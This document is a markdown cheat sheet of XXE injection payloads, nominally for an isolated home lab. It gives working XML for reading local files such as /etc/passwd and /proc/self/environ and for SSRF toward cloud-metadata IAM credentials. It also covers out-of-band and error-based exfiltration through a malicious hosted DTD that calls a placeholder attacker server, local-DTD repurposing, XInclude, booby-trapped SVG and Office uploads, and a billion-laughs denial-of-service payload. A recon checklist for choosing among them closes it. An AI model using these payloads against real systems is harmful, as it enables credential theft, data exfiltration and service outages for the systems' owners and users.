# XXE Injection — Payload Reference for Home Lab Use

> **Disclaimer:** These payloads are provided strictly for use in an isolated, self-hosted home lab (e.g., OWASP Juice Shop, DVWA, WebGoat, or your own deliberately vulnerable test containers) that you own and control. Do not run these against any system you do not have explicit, documented authorization to test, and do not share, publish, or redistribute this file outside your own study environment. Unauthorized testing against third-party systems is illegal in most jurisdictions.

Every payload below uses placeholders (`YOUR-OOB-SERVER`, `YOUR-DTD-URL`, `TARGET-FILE`) — replace them with your own lab infrastructure (an `interactsh` client, a local `python3 -m http.server`, or a listener on your attack VM) before use. None of these are pre-populated with any real hostname.

---

## 1. Basic in-band file read

Use when the application reflects parsed XML content or a parse error back in the response.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [ <!ENTITY xxe SYSTEM "file:///TARGET-FILE"> ]>
<data>&xxe;</data>
```

Common lab targets to start with: `/etc/hostname`, `/etc/passwd`, `/proc/self/environ`, `/proc/version`, or an app config file if you know the stack (e.g. `/app/package.json`, `web.config`, `application.properties`).

---

## 2. Basic SSRF against internal services / cloud metadata

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<data>&xxe;</data>
```

Walk the returned directory listing path-by-path toward credentials (e.g. `/latest/meta-data/iam/security-credentials/<role-name>`). In a real IMDSv2-enforced environment this will fail — see note in the writeup about why (token/header requirement).

Local-network variant, for probing what else is reachable from the server:
```xml
<!DOCTYPE data [ <!ENTITY xxe SYSTEM "http://internal-service.local:PORT/"> ]>
```

---

## 3. Blind OOB existence check

Use when there's no reflection at all — you need a side channel to confirm the entity was resolved.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [ <!ENTITY xxe SYSTEM "http://YOUR-OOB-SERVER"> ]>
<data>&xxe;</data>
```

Watch your listener for an incoming DNS lookup and/or HTTP GET.

---

## 4. Parameter-entity form (bypasses filters that only match `&name;` in the body)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [<!ENTITY % xxe SYSTEM "http://YOUR-OOB-SERVER"> %xxe; ]>
<data>test</data>
```

No reference to `%xxe` is needed in the document body — resolution happens purely inside the DTD.

---

## 5. Blind file exfiltration via malicious external DTD (OOB)

**Host this as `malicious.dtd` on your own lab HTTP server:**
```dtd
<!ENTITY % file SYSTEM "file:///TARGET-FILE">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-OOB-SERVER/?x=%file;'>">
%eval;
%exfil;
```

**Trigger from the injection point:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR-DTD-URL/malicious.dtd"> %xxe;]>
<data>test</data>
```

File contents arrive in your listener's query-string log. If the target file may contain characters that break a URL or XML (`&`, `<`, `>`, newlines), base64-encode the read first if the underlying stack supports it — e.g. on PHP targets:
```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/TARGET-FILE">
```
(Node.js/Java/.NET targets generally don't support `php://` wrappers — stick to small, character-safe files first when testing those stacks.)

---

## 6. Error-based exfiltration (no outbound network access needed)

Same DTD-hosting requirement as §5, but instead of exfiltrating over HTTP, force a `FileNotFoundException`-style error that embeds the file contents in its own message:

```dtd
<!ENTITY % file SYSTEM "file:///TARGET-FILE">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

Same trigger request as §5. Only useful if the target's error handler is verbose enough to return raw parser exceptions — test this first by intentionally sending malformed XML and checking whether the response leaks a stack trace or exception string.

---

## 7. Repurposing a local DTD (works even with zero outbound network access)

Use when the target has no egress at all — everything happens via `file://`, no hosted DTD required.

```xml
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///PATH/TO/LOCAL.dtd">
  <!ENTITY % REDEFINED_ENTITY_NAME '
    <!ENTITY &#x25; file SYSTEM "file:///TARGET-FILE">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

You need to know a DTD path that exists on the target OS/stack, and an entity name it declares, to redefine. Common candidates to probe for on Linux hosts:
- `/usr/share/yelp/dtd/docbookx.dtd` (GNOME/Yelp — declares `ISOamso` and others)
- `/usr/share/xml/docbook/schema/dtd/*/docbookx.dtd`
- Any DTD bundled with a Java runtime or XML toolkit installed on the box

Fingerprint the OS/stack first (via other recon, or an initial local-DTD read attempt against `/etc/os-release`) before guessing paths blindly.

---

## 8. XInclude (works when you only control a data fragment, not the full document/DOCTYPE)

```xml
<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="/TARGET-FILE" parse="text"/>
```

Blind/OOB confirmation variant:
```xml
<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="http://YOUR-OOB-SERVER/probe"/>
```

Useful whenever your input lands inside a pre-existing server-side XML document (a single field value, for example) rather than as the whole request body — no `<!DOCTYPE>` declaration is needed or possible in that context.

---

## 9. XXE via SVG / image upload

Save as a `.svg` file and upload through an image-upload feature:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///TARGET-FILE" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

View the processed/served image afterward — the file contents render as visible text if the upload handler parses SVG without stripping the DOCTYPE.

---

## 10. Office document (DOCX/XLSX/PPTX/ODT) delivery

These formats are ZIP archives containing XML parts. To test an upload/import feature that parses office documents:

1. Create a minimal valid document of the target type (e.g. an empty `.docx` in Word/LibreOffice).
2. Unzip it: `unzip test.docx -d test_docx/`
3. Inject an entity/DOCTYPE into one of the XML parts most likely to be parsed early — commonly `word/document.xml`, `[Content_Types].xml`, or `docProps/core.xml`:
   ```xml
   <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://YOUR-OOB-SERVER"> ]>
   ```
   (Placement depends on the part's existing root element and schema — you may need `%xxe;`-style parameter entities if the schema is strict about where a DOCTYPE can sit relative to the XML declaration.)
4. Re-zip: `cd test_docx && zip -r ../payload.docx . -x '.*'`
5. Upload `payload.docx` and monitor your OOB listener.

---

## 11. Denial-of-service probe (entity expansion / "billion laughs") — use with caution, even in your own lab

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>
```
Each nesting level multiplies expansion roughly 10x — this small example already expands to ~10,000 repetitions; going further (`lol5`, `lol6`...) grows exponentially and can crash a parser or exhaust memory even at moderate nesting depth. Only run this against a container/VM you can freely restart, and never against shared or resource-constrained lab infrastructure.

---

## Quick recon checklist before picking a payload

- Does the response reflect any parsed value or raw parser error? → try §1/§2 first (in-band, fastest to confirm).
- No reflection at all? → confirm the primitive with §3 (OOB ping) before building anything more complex.
- Regular entity blocked/filtered? → switch to the parameter-entity form (§4).
- Need to actually exfiltrate data blind? → §5 (OOB) or §6 (error-based, no egress needed).
- Suspect the target has no outbound network access? → §7 (local DTD repurposing).
- Only control a fragment of an existing document, not the full body? → §8 (XInclude).
- Testing an image/document upload feature? → §9 or §10.
